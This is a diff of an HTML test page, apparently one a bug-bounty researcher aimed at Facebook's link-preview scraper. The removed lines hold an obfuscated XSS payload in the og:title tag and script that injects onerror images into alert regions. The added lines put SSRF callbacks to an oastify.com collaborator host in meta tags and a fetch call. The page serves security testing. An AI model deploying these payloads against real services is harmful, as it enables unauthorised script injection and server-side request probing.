@@ -1,32 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta property="fb:app_id" content="966242223397117">
     <meta property="og:url" content="https://xsstestfb.vercel.app/">
     <meta property="og:type" content="website">
-    <meta property="og:description" content="Verified Security Research - hasn0x">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
+    
+    <meta property="og:image" content="http://zps3cfbenp0byl113oka6jx06rci08ox.oastify.com/image.png">
+    
+    <meta property="og:title" content="Testing Research">
+    <meta property="og:description" content="Reference: http://zps3cfbenp0byl113oka6jx06rci08ox.oastify.com/ref">
 
-    <meta property="og:title" content="Verified &#x22;><img src=x onerror=&#x22;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))&#x22;>">
-
-    <title>Bug Bounty Lab</title>
+    <title>SSRF Lab - hasn0x</title>
 </head>
 <body>
+    <h1>SSRF Testing in progress...</h1>
     <script>
-        // তোমার সেই সফল হওয়া ARIA Sink লজিক
-        setInterval(() => {
-            const sinks = document.querySelectorAll('[aria-live="assertive"], [role="alert"]');
-            sinks.forEach(s => {
-                if(!s.dataset.pwned) {
-                    s.dataset.pwned = "true";
-                    const i = document.createElement('img');
-                    i.src = 'x';
-                    i.onerror = () => { alert('DOM_Sink_Success_hasn0x'); };
-                    s.appendChild(i);
-                }
-            });
-        }, 500);
+        fetch('http://zps3cfbenp0byl113oka6jx06rci08ox.oastify.com/js_hit');
     </script>
 </body>
 </html>
